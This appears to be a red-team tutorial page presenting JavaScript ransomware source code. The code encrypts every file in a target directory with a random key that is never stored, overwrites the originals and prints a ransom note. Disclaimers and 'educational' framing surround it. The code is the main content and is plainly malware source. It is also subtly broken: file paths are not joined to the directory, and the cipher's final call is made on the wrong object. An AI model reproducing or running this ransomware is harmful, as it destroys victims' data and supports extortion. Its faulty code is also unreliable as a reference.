# Ransomware Code in JavaScript (Example)
##### RedTeam - Techniques for 'Offensive Security' by Volkan Sah - Simple Codings (update 04/2023)

⚠️ Please note that exploiting security vulnerabilities without permission and creating or using ransomware is illegal and unethical, and may result in criminal charges. Use this informations responsibly and only on networks you have permission to access. ⚠️

Ransomware attacks are one of the most destructive and malicious types of cyber threats, often resulting in significant financial losses and personal data theft. It is important to understand the mechanisms of ransomware attacks in order to protect yourself and your systems from these malicious threats.

This JavaScript code provides a simplified example of a ransomware attack and its underlying techniques. It is intended for educational and ethical hacking purposes only, and should not be used for any illegal or unethical activities. It is important to always abide by the law and use technology responsibly and ethically to promote positive outcomes for society.


## Example 
```javascript
// Ransomware code (for demonstration purposes only)
var fs = require('fs');
var crypto = require('crypto');

// The first step is to identify the directory to be targeted for file encryption.
// Directory to target for file encryption
var targetDirectory = '/user/files';

// Generate encryption key
// Once the encryption key is generated, the code will read all files in the target directory.
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read all files in the target directory
fs.readdirSync(targetDirectory).forEach(file => {
  // Skip directories
  if (fs.lstatSync(file).isDirectory()) return;

  // Read file data
  var data = fs.readFileSync(file);

  // Encrypt file data with encryption key
  var encryptedData = crypto
    .createCipher('aes-256-cbc', encryptionKey)
    .update(data, 'utf8', 'hex') +
    crypto.createCipher.final('hex');

  // Write encrypted data back to file
  // Finally, the code will display a ransom note to the user, demanding payment in exchange for the decryption key.

  fs.writeFileSync(file, encryptedData);
});

// Display ransom note to user
var ransomNote = `
Your files have been encrypted!
e.g
`;

console.log(ransomNote);

```

##  Note
As technology continues to advance, it's more important than ever to protect ourselves and our systems from malicious attacks. With the rise of dangerous JavaScript techniques that can be executed through the browser, it's crucial to take proactive measures to safeguard your browsing experience.
